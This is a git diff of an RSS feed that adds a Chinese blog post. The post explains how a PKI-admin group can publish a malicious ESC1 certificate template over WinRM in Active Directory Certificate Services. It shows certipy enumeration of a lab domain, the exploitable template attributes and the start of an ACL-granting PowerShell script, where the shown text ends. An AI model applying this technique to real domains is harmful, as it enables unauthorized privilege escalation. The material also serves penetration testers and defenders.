@@ -2,16 +2,658 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>域渗透 on wackymaker</title>
-        <link>http://localhost:1313/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/</link>
+        <link>https://wackymaker.github.io/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/</link>
         <description>Recent content in 域渗透 on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Thu, 28 Aug 2025 13:43:59 +0800</lastBuildDate><atom:link href="http://localhost:1313/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 03 Sep 2025 18:42:12 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>ca管理员权限解析及利用发布恶意模板攻击</title>
+        <link>https://wackymaker.github.io/post/adcsmake/</link>
+        <pubDate>Wed, 03 Sep 2025 18:42:12 +0800</pubDate>
+        
+        <guid>https://wackymaker.github.io/post/adcsmake/</guid>
+        <description>&lt;h2 id=&#34;本文导读&#34;&gt;本文导读
+&lt;/h2&gt;&lt;p&gt;pki是一种公钥认证基础，用来实现证书的发布管理等，Microsof实现的PKI被称为 Active Directory证书服务（Active Directory Certificate ServicesAD CS）其在很大程度上受到安全社区的关注。&lt;/p&gt;
+&lt;p&gt;当我们在域渗透的过程中，经常会见到pki admin或者Certificate Managers这些组，无论是实战环境还是渗透比赛，这都意味着我们可以枚举域内存在漏洞的证书模板并加以利用。&lt;/p&gt;
+&lt;p&gt;但其实这种组都是域环境自建组，域环境并不具备默认的ca管理组（除了域管），这种环境中的自建组一般只会分配证书请求颁发发布的权限，也就意味着如果当前环境并不存在恶意模板，我们就不能利用对ca的全部掌控权限打黄金证书，所以我在思考这种攻击路径时意识到，只要存在这种自建组，其实我们完全具备权限发布恶意模板并请求证书，做到自己部署可攻击环境。
+这显而易见不是吗。证书服务管理组理应获得如此权限，但是当我尝试进行测试时发现，如果我们想发布恶意证书，就需要权限的同时还需要桌面交互会话，否则你无法操控证书管理certsrv.msc。所以本文的重点将放在：如何仅利用winrm会话发布并注册恶意模板并加以利用。
+我查找了中外很多文章，确定这条攻击路径目前没有人发布过，所以本文将详细描述一下这种攻击所需要的权限，以及具体的攻击手法，虽然其中涉及大量powershell语法。&lt;/p&gt;
+&lt;h2 id=&#34;恶意证书部署流程&#34;&gt;恶意证书部署流程
+&lt;/h2&gt;&lt;p&gt;首先可以看一下我现在目标靶机环境&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/adcs-test&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; certificate authority
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; enabled certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; OIDs linked to templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Retrieving CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackadcs-DC-CA&amp;#39;&lt;/span&gt; via RRP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Failed to connect to remote registry. Service should be starting now. Trying again...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Failed to get CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackadcs-DC-CA&amp;#39;&lt;/span&gt; via RRP: Expected a bytes object &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; security descriptor, got &amp;lt;class &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;str&amp;#39;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Could not retrieve configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackadcs-DC-CA&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Checking web enrollment &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; CA &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackadcs-DC-CA&amp;#39;&lt;/span&gt; @ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc.wackadcs.com&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: timed out
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: timed out
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumeration output:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CA Name                             : wackadcs-DC-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DNS Name                            : dc.wackadcs.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Subject                 : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;wackadcs-DC-CA, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;wackadcs, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Serial Number           : 19F9595699CD919E41F8D2620299CFA0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity Start          : 2025-08-28 08:34:40+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity End            : 2030-08-28 08:44:40+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Web Enrollment
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTPS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    User Specified SAN                  : Unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Request Disposition                 : Unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enforce Encryption &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Requests     : Unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Active Policy                       : Unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Disabled Extensions                 : Unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Templates                   : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Could not find any certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到证书服务配置正常，但是没有可以利用的证书&lt;/p&gt;
+&lt;p&gt;为了部署恶意证书我们能从&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/en-us/intune/intune-service/protect/microsoft-cloud-pki-fundamentals&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;微软&lt;/a&gt;的pki文档中了解证书发布的流程&lt;/p&gt;
+&lt;p&gt;首先我们需要准备一个恶意证书模板，我的目光首先放在了esc1模板上，这是一种在adcs中最易于攻击的模板，而&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/en-us/powershell/module/pki/new-selfsignedcertificate?view=windowsserver2025-ps&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;微软的自签名模板&lt;/a&gt;以及一个证书模板需要如下5块信息&lt;/p&gt;
+&lt;h3 id=&#34;准备模板&#34;&gt;准备模板
+&lt;/h3&gt;&lt;p&gt;基本信息中我们需要定义模板的名称以及类型标志版本，我简单配置如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ESC1&amp;#34;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#AD中对象的内部名字（用于引用）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;displayName	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ESC1&amp;#34;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#CA界面显示名称&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKICertificateTemplate&amp;#34;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#LDAP对象类型，表示这是一个证书模板&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flags	131616	&lt;span style=&#34;color:#75715e&#34;&gt;#模板标志，控制模板行为（如允许导出私钥、自动注册等）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;revision	100	&lt;span style=&#34;color:#75715e&#34;&gt;#模板版本号，增加后表示模板有更新&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;oid和应用策略&#34;&gt;OID和应用策略
+&lt;/h3&gt;&lt;p&gt;oid是对象标识符，可以理解为一个全局唯一的标识信息，主要是msPKI-Certificate-Application-Policy属性中的值1.3.6.1.5.5.7.3.2代表了允许客户端验证&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-Cert-Template-OID	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639&amp;#34;&lt;/span&gt;,	&lt;span style=&#34;color:#75715e&#34;&gt;#模板的唯一标识符，用于 CA 识别模板&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-Certificate-Application-Policy	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.3.6.1.5.5.7.3.2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#证书用途（EKU），这里 1.3.6.1.5.5.7.3.2 表示 客户端身份认证&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-Certificate-Name-Flag	1	&lt;span style=&#34;color:#75715e&#34;&gt;#控制 CN 名称如何生成（1 通常表示使用用户的主体名称）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;密钥和名称加密&#34;&gt;密钥和名称加密
+&lt;/h3&gt;&lt;p&gt;这一段是和正常模板一致的，可以随便导出一张证书复制过来或者ai生成&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-Minimal-Key-Size	2048	&lt;span style=&#34;color:#75715e&#34;&gt;#证书最小密钥长度&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-Private-Key-Flag	16842752	&lt;span style=&#34;color:#75715e&#34;&gt;#控制私钥属性（可导出、可签名、可加密等）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pKIDefaultCSPs	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3,Microsoft Base DSS Cryptographic Provider&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2,Microsoft Base Cryptographic Provider v1.0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1,Microsoft Enhanced Cryptographic Provider v1.0&amp;#34;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#默认使用的加密服务提供者（CSP）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pKIDefaultKeySpec	2	&lt;span style=&#34;color:#75715e&#34;&gt;#默认密钥用途（签名=1，加密=2，这里是加密）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;生命周期和有效期&#34;&gt;生命周期和有效期
+&lt;/h3&gt;&lt;p&gt;同上，找模板复制即可&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pKIExpirationPeriod	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0,64,57,135,46,225,254,255&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#证书有效期，二进制编码表示&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pKIOverlapPeriod	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0,128,166,10,255,222,255,255&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#证书续订重叠期，二进制表示&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pKIMaxIssuingDepth	0	&lt;span style=&#34;color:#75715e&#34;&gt;#最大颁发深度（0 = 无限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;扩展属性&#34;&gt;扩展属性
+&lt;/h3&gt;&lt;p&gt;这段需要包含证书的关键扩展（Key Usage, Basic Constraints），以及重复指定pKIExtendedKeyUsage参数[&amp;ldquo;1.3.6.1.5.5.7.3.2&amp;rdquo;]表示此模板为客户端认证用途&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pKICriticalExtensions	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2.5.29.15&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2.5.29.7&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#证书的关键扩展（Key Usage, Basic Constraints）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pKIExtendedKeyUsage	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.3.6.1.5.5.7.3.2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;#扩展密钥用途，重复指定客户端身份认证&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-Enrollment-Flag	0	&lt;span style=&#34;color:#75715e&#34;&gt;#注册标志（0 = 不自动注册）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-RA-Signature	0	&lt;span style=&#34;color:#75715e&#34;&gt;#RA 签名属性，0 表示默认&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-Template-Minor-Revision	4	&lt;span style=&#34;color:#75715e&#34;&gt;#小版本号，用于模板升级&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msPKI-Template-Schema-Version	2	&lt;span style=&#34;color:#75715e&#34;&gt;#模板 schema 版本（AD 内部版本控制）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;pkiadmin组权限构筑&#34;&gt;pkiadmin组权限构筑
+&lt;/h3&gt;&lt;p&gt;现在为了发布这个模板让其能正常使用，我们需要进行如下三步&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;为这个模板创建对应的OID对象&lt;/li&gt;
+&lt;li&gt;创建证书模板（我们已经完成了这步）&lt;/li&gt;
+&lt;li&gt;发布模板到ca&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;为了完成前两种种操作，pkiadmin组分别需要对OID Container和Certificate Templates这两个容器有 CreateChild, WriteProperty权限，这表示了pkiadmin可以对证书模板以及oid设置有子类创建以及写入的权限，用于导入模板的使用&lt;/p&gt;
+&lt;p&gt;而一旦模板导入，我们需要其对ca的WriteProperty权限用于注册证书（注意这里WriteProperty权限即可，完全掌控就可以打黄金证书了，但是没有权限的话在后续会提示权限不足，我已经失败过很多次了）&lt;/p&gt;
+&lt;p&gt;我在一个配置好了域控及证书服务的环境当中创建了一个空白的pkiadmin组，并用了如下脚本分配了以上我提到的权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取配置命名上下文&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ConfigNC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Get-ADRootDSE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.configurationNamingContext
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 容器路径&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$TemplateCN &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Certificate Templates,CN=Public Key Services,CN=Services,&lt;/span&gt;$ConfigNC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$OIDCN      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=OID,CN=Public Key Services,CN=Services,&lt;/span&gt;$ConfigNC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$EnrollmentPath &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Enrollment Services,CN=Public Key Services,CN=Services,&lt;/span&gt;$ConfigNC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取 CA&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$CAs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Get-ADObject -SearchBase $EnrollmentPath -SearchScope OneLevel -Filter *
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取 PKIAdmins SID&lt;/span&gt;
